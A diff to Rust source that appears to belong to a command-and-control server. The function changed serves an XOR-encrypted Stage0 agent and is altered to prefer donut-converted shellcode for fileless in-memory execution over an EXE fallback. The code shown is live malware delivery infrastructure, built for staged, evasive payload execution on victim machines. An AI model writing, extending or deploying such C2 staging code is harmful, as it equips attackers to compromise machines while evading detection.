@@ -536,29 +536,29 @@ const AGENT_XOR_KEY: &[u8] = b"C2R2_STAGE0_AGENT_KEY_2026";
 /// - First 4 bytes: XOR key length (little-endian u32)
 /// - Next N bytes: XOR key
 /// - Next 4 bytes: agent size (little-endian u32)
-/// - Remaining: XOR encrypted agent bytes (EXE format for process execution)
+/// - Remaining: XOR encrypted agent bytes (shellcode format for in-memory execution)
 pub async fn download_stage0_agent() -> impl axum::response::IntoResponse {
     use axum::http::{header, StatusCode};
     use std::fs;
     
-    // Stage0 now executes agent as a process, so we serve the EXE directly
-    // (not shellcode). Prioritize .exe over .bin
-    // Multiple paths to support different deployment scenarios
+    // Stage0 executes agent as SHELLCODE in memory (fileless)
+    // Prioritize .bin (donut shellcode) over .exe
+    // The .bin is created by donut from agent.exe and can run entirely in memory
     let agent_paths = [
-        // Same directory as server (common deployment)
-        "agent.exe",
+        // Shellcode versions (preferred - donut-converted for in-memory execution)
         "agent.bin",
-        // Subdirectories
-        "dist/agent.exe",
         "dist/agent.bin",
-        "agent/agent.exe",      // Pi deployment structure
         "agent/agent.bin",
-        "modules/agent.exe",
         "modules/agent.bin",
-        // Parent directory
+        "../agent.bin",
+        "../dist/agent.bin",
+        // EXE fallback (will trigger file-based execution in Stage0)
+        "agent.exe",
+        "dist/agent.exe",
+        "agent/agent.exe",
+        "modules/agent.exe",
         "../agent.exe",
         "../dist/agent.exe",
-        "../agent/agent.exe",
     ];
     
     let agent_path = agent_paths.iter().find(|p| std::path::Path::new(p).exists());
